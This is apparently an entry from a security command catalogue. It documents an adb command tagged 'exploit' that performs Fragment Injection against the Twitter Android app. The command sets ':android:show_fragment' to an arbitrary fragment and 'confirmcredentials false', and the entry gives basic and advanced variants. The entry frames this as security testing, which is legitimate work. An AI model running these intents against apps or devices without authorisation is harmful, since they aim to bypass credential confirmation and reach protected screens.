---
id: cmd-adb-am-start
data: >-
  adb shell am start -n com.twitter.android/.WidgetSettingsActivity --esa
  ":android:show_fragment"
  com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment --ez
  confirmcredentials false --fi Intent.FLAG_ACTIVITY_CLEAR_TASK
tags:
  - exploit
  - android
  - adb
  - intent
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:39.275Z'
verified: false
validated: true
submitted: true
---
# adb-am-start

## Command

```bash
adb shell am start -n com.twitter.android/.WidgetSettingsActivity --esa ":android:show_fragment" com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment --ez confirmcredentials false --fi Intent.FLAG_ACTIVITY_CLEAR_TASK
```

## Description

This ADB command starts an Android activity with custom extras to simulate a malicious intent for Fragment Injection testing in the Twitter app.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Specifies component name (package/activity) | Yes |
| --esa | Adds string extra (e.g., ":android:show_fragment" with fragment class) | Yes |
| --ez | Adds boolean extra (e.g., confirmcredentials false) | No |
| --fi | Adds intent flags (e.g., FLAG_ACTIVITY_CLEAR_TASK) | Yes |

## Examples

### Basic Usage

```bash
adb shell am start -n com.twitter.android/.WidgetSettingsActivity --esa ":android:show_fragment" com.samsung.android.sdk.pen.objectruntime.preload.VideoIntentFragment
```

### Advanced Usage

```bash
adb shell am start -a android.intent.action.VIEW -n com.twitter.android/.WidgetSettingsActivity --esa ":android:show_fragment" arbitrary.fragment --ez confirmcredentials false
```

## Expected Output

"Starting: Intent { cmp=com.twitter.android/.WidgetSettingsActivity ... }" followed by app launch and potential crash.

## Related

- [[Related Procedure: Craft-Malicious-Intent-for-Fragment-Injection]]
